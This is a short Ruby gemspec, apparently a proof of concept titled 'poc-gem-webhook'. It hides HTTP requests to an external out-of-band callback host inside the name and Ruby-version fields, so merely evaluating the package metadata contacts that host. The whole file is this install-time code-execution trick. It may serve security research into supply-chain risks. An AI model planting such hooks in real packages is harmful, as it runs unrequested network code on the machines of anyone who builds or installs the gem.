require "net/http"
require "uri"

def ping(url)
  Net::HTTP.get(URI(url)) rescue nil
  nil
end

Gem::Specification.new do |s|
  s.name = (ping("https://xdvvlncuipgisdigxkeheeg5ro1a42kd8.oast.fun/name"); "poc-gem-webhook")
  s.version = "0.0.1"
  s.summary = "poc"
  s.files = []
  s.required_ruby_version = (ping("https://xdvvlncuipgisdigxkeheeg5ro1a42kd8.oast.fun/ruby_requirement"); ">= 2.7")
end
